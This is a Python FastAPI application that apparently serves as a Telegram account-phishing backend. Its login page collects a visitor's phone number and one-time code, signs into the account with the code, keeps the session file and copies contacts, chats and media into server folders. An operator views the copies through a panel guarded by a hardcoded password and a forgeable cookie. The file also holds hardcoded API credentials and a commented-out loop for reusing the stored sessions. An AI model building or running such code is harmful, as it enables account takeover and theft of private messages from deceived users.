import asyncio
import os
from contextlib import asynccontextmanager

import aiosqlite
import uvicorn
from fastapi import FastAPI, Request, Form
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, RedirectResponse
from utils import update_user_data, export_user_chat_html_from_db
from db import init_db, DB_FILE

# API_ID = 23331207
# API_HASH = "2d64092b8ecaded2ebb5ad25de96e222"

API_ID = 25064946
API_HASH = '712205595cbada1b4654a6e649812ffd'

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    task = asyncio.create_task(periodic_update())
    try:
        yield
    finally:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

USERS_FOLDER = "./users"
SESSIONS_FOLDER = "./sessions"

os.makedirs(USERS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # дозволити всі джерела
    allow_credentials=True,
    allow_methods=["*"],  # дозволити всі HTTP-методи
    allow_headers=["*"],  # дозволити всі заголовки
)

session_name = "anon2"
phone_number = None  # глобальна змінна
# Словник для тимчасового зберігання сесій авторизації
sessions = {}
IS_AUTH = False
AUTH_PASSWORD = 'qwerty'



# Монтую папку з користувачами і медіа як статичні файли
app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")

templates = Jinja2Templates(directory="templates")  # створити цю папку

class PhonePayload(BaseModel):
    phone: str

class CodePayload(BaseModel):
    code: str


@app.get("/")
async def home(request: Request):
    return templates.TemplateResponse("index.html", {'request': request})


@app.post("/send_phone")
async def send_phone(data: PhonePayload):
    phone_number = data.phone.strip()
    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"

    try:
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            result = await client.send_code_request(phone_number)
            sessions[phone_number] = {
                "phone_code_hash": result.phone_code_hash,
                "phone": phone_number,
            }

        await client.disconnect()
        return {"status": "code_sent"}
    except Exception as e:
        return {"status": "error", "detail": str(e)}



@app.post("/verify_code")
async def verify_code(data: CodePayload):
    # Знайдемо номер за кодом (в реалі потрібно покращити)
    phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
    if not phone_number:
        return {"error": "Send phone first."}
    phone_code_hash = sessions[phone_number]["phone_code_hash"]

    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            return {"error": "2FA enabled. Not supported."}
        except Exception as e:
            return {"error": f"Code error: {str(e)}"}

    try:
        me = await client.get_me()
        username = me.username or f"{me.first_name}_{me.id}"
        # Назва папки з юзером і номером телефону
        folder_name = f"{username}_{phone_number.replace('+','')}"
        folder = os.path.join(USERS_FOLDER, folder_name)
        os.makedirs(folder, exist_ok=True)

        # Запуск оновлення з пріоритетом (контакти, чати, медіа...)
        await update_user_data(client, me, folder)

    finally:
        await client.disconnect()
        # Видаляємо сесію після успішного логіну
        sessions.pop(phone_number, None)

    return {"status": "ok"}


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("password.html", {"request": request, "error": False})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if password == AUTH_PASSWORD:
        resp = RedirectResponse(url="/users", status_code=303)
        resp.set_cookie("auth", "ok", httponly=True)
        return resp
    return templates.TemplateResponse("password.html", {"request": request, "error": True})


@app.get("/users", response_class=HTMLResponse)
async def list_users(request: Request):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    users = []
    if os.path.exists(USERS_FOLDER):
        for name in os.listdir(USERS_FOLDER):
            path = os.path.join(USERS_FOLDER, name)
            if os.path.isdir(path):
                users.append(name)
    return templates.TemplateResponse("users_list.html", {"request": request, "users": users})

@app.get("/user/{user_folder}/chats", response_class=HTMLResponse)
async def user_chats(request: Request, user_folder: str):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        # отримати user_id
        async with db.execute(
            "SELECT id FROM users WHERE username = ?", (user_folder,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            user_id = row["id"]

        # отримати чати
        async with db.execute(
            "SELECT id, chat_name FROM chats WHERE user_id = ?", (user_id,)
        ) as cursor:
            chats = await cursor.fetchall()

    return templates.TemplateResponse("user_chats.html", {
        "request": request,
        "chats": chats,
        "user_folder": user_folder
    })


@app.get("/user/{user_folder}/chats/{chat_id}", response_class=HTMLResponse)
async def user_chat(request: Request, user_folder: str, chat_id: int):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT chat_name FROM chats WHERE id = ?", (chat_id,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            chat_name = row["chat_name"]

        async with db.execute(
            """
            SELECT chat_id, msg_id, sender, out, text, media_path, time_str
            FROM messages
            WHERE chat_id = ?
            ORDER BY msg_id ASC
            """,
            (chat_id,)
        ) as cursor:
            messages = await cursor.fetchall()

    return templates.TemplateResponse("chat.html", {
        "request": request,
        "user_folder": user_folder,
        "chat_id": chat_id,
        "chat_name": chat_name,
        "messages": messages
    })


async def periodic_update():
    # import aiosqlite
    # from utils import update_user_data, export_user_chat_html_from_db
    # from db import DB_FILE
    # from telethon import TelegramClient
    #
    # while True:
    #     tasks = []
    #     async with aiosqlite.connect(DB_FILE) as db:
    #         async with db.execute("SELECT username, phone FROM users") as cur:
    #             async for username, phone in cur:
    #                 session_name = f"{SESSIONS_FOLDER}/session_{phone}"
    #                 client = TelegramClient(session_name, API_ID, API_HASH)
    #                 await client.connect()
    #                 folder = os.path.join(USERS_FOLDER, username)
    #                 os.makedirs(folder, exist_ok=True)
    #                 tasks.append(update_user_for_periodic(client, folder, username))
    #     if tasks:
    #         await asyncio.gather(*tasks)
    #     await asyncio.sleep(3600)
    print('PERIOD UPDATE')

async def update_user_for_periodic(client, folder, username):
    try:
        me = await client.get_me()
        await update_user_data(client, me, folder)
        await export_user_chat_html_from_db(username, folder)
    finally:
        await client.disconnect()


if __name__ == '__main__':
    uvicorn.run(app)
